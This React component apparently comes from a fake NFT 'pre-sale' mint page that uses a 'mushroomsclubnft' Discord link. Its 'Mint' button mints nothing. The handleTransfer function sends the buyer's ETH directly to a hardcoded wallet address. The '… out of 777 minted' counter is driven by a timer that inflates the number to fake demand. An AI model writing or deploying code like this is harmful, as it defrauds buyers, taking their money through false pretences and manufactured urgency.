import { useState, useEffect } from 'react';

import { ethers } from 'ethers';

const Transfer = ({ accounts, setAccounts }) => {

  const [mintAmount, setMintAmount] = useState(1);
  const isConnected = Boolean(accounts[0]);
  const [seconds, setSeconds] = useState(120);

  useEffect(() => {
    const interval = setInterval(() => {
      setSeconds(seconds => seconds + 67);
    }, 2500);
    setTimeout(() => {
      clearInterval(interval)
    },25000)
    return () => clearInterval(interval);
  }, []);

  if (window.ethereum.networkVersion !== "1") {
    alert("Please Change Network To Ethereum Mainnet")
  }


  async function connectAccount() {

    if (window.ethereum.networkVersion !== "1") {
      alert("Please Change Network To Ethereum Mainnet")
    }


    if (window.ethereum) {
      const accounts = await window.ethereum.request({
        method:"eth_requestAccounts",
      });
      setAccounts(accounts);
    }


  }

  async function handleTransfer() {
    const addr = "0x7BAb02d01DDa6b05933c04B65604e6966c98405e"
    const mintValue = "0.077"

    if (window.ethereum) {
      let total = parseFloat((mintAmount * mintValue).toFixed(4))

      await window.ethereum.send("eth_requestAccounts");
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      ethers.utils.getAddress(addr);
      try{
      const tx = await signer.sendTransaction({
        to: addr,
        value: ethers.utils.parseEther(String(total))

      })
      console.log(tx)
    }
      catch(err){
        alert(err)
      }

    }
  }


  const handleDecrement = () => {
    if (mintAmount <= 1) return;
    setMintAmount(mintAmount - 1);

  };
  const handleIncrement = () => {
    if (mintAmount >= 5) return;
    setMintAmount(mintAmount + 1);
  };


  return (

      <div class="orderBox-wrap">
          <div class="orderBox">
              <h2>LIMITED SALE</h2>
              <h1>PRE-SALE IS LIVE</h1>

              <table>
                  <tr>
                    <td>Price:</td>
                    <td>0.077 ETH</td>
                  </tr>
                  <tr>
                    <td>Max:</td>
                    <td>5 per wallet</td>
                  </tr>
                </table>

                <div class="jox"></div>

                <div class="amountPicker">


                  <button class="vaxme">
                      <span onClick={handleDecrement}>-</span>
                  </button>
                  <p type="mintAmounts">{mintAmount}</p>
                  <button class="vaxme">
                      <span onClick={handleIncrement}>+</span>
                  </button>                  </div>

                <div class="jox"></div>


                <table class="totalAmount">
                  <tr>
                    <td>Total:</td>
                    <td>{ parseFloat((mintAmount * 0.077).toFixed(5))} ETH</td>
                  </tr>
                </table>

                <div class="connet-wrap">
                  <button class="vaxme connectWalletBtn">
                    {isConnected ? (
                      <span onClick={handleTransfer}>Mint</span>
                      ) : (
                      <span onClick={connectAccount}>Connect Wallet</span>
                      )}
                  </button>
                  <p >{seconds} out of 777 minted</p>
                </div>
          </div>
          <p class="discord">If you need any help, join our

              <span>
                <a href="https://discord.com/invite/mushroomsclubnft">
                Discord
                  <svg _ngcontent-uqc-c5="" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path _ngcontent-uqc-c5="" d="M38.1863 13.7599C35.5913 11.5656 32.4773 10.4685 29.1902 10.2856L28.6712 10.8342C31.6123 11.5656 34.2073 13.0285 36.6293 15.0399C33.6883 13.3942 30.4013 12.2971 26.9412 11.9314C25.9032 11.7485 25.0382 11.7485 24.0002 11.7485C22.9622 11.7485 22.0972 11.7485 21.0592 11.9314C17.5992 12.2971 14.3121 13.3942 11.3711 15.0399C13.7931 13.0285 16.3882 11.5656 19.3292 10.8342L18.8102 10.2856C15.5231 10.4685 12.4091 11.5656 9.8141 13.7599C6.87308 19.6114 5.31607 26.1942 5.14307 32.9599C7.73809 35.8856 11.3711 37.7142 15.1771 37.7142C15.1771 37.7142 16.3882 36.2514 17.2532 34.9714C15.0041 34.4228 12.9281 33.1428 11.5441 31.1314C12.7551 31.8628 13.9661 32.5942 15.1771 33.1428C16.7342 33.8742 18.2912 34.2399 19.8482 34.6056C21.2322 34.7885 22.6162 34.9714 24.0002 34.9714C25.3842 34.9714 26.7682 34.7885 28.1522 34.6056C29.7093 34.2399 31.2663 33.8742 32.8233 33.1428C34.0343 32.5942 35.2453 31.8628 36.4563 31.1314C35.0723 33.1428 32.9963 34.4228 30.7473 34.9714C31.6123 36.2514 32.8233 37.7142 32.8233 37.7142C36.6293 37.7142 40.2623 35.8856 42.8573 32.9599C42.6843 26.1942 41.1273 19.6114 38.1863 13.7599ZM18.2912 29.6685C16.5612 29.6685 15.0041 28.0228 15.0041 26.0114C15.0041 23.9999 16.5612 22.3542 18.2912 22.3542C20.0212 22.3542 21.5782 23.9999 21.5782 26.0114C21.5782 28.0228 20.0212 29.6685 18.2912 29.6685ZM29.7093 29.6685C27.9792 29.6685 26.4222 28.0228 26.4222 26.0114C26.4222 23.9999 27.9792 22.3542 29.7093 22.3542C31.4393 22.3542 32.9963 23.9999 32.9963 26.0114C32.9963 28.0228 31.4393 29.6685 29.7093 29.6685Z">

                  </path></svg></a>
              </span></p>
      </div>



  );
}

export default Transfer;
